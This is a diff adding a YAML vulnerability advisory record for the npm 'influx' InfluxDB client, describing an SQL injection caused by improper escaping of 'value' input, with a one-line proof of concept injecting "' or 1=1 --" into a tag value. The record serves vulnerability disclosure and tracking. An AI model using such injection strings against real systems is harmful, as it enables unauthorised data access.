@@ -1,0 +1,33 @@
+---
+- id: snykio:npm:influx:559587
+  title: SQL Injection
+  description: |
+    [influx][1] is an InfluxDB Client for Node.js and Browsers.
+
+    Affected versions of this package are vulnerable to SQL Injection due to
+    improperly escaping `value` input.
+
+    \###PoC
+
+        const influx = require('influx')
+        const exp = new influx.Expression();
+        exp.tag('symbol').equals.value("GAZP()\\' or 1=1 --").toString()
+
+
+
+    [1]: https://www.npmjs.com/package/influx
+  affected_package: influx
+  vulnerable_versions:
+  - "*"
+  severity: high
+  package_manager: npm
+  cwe:
+  - CWE-89
+  disclosed_date: 2020-06-23
+  created_date: 2020-06-23
+  last_modified_date: 2020-06-23
+  credit:
+  - Zeruk
+  references:
+  - https://github.com/node-influx/node-influx/issues/486
+  source_url: https://snyk.io/vuln/SNYK-JS-INFLUX-559587
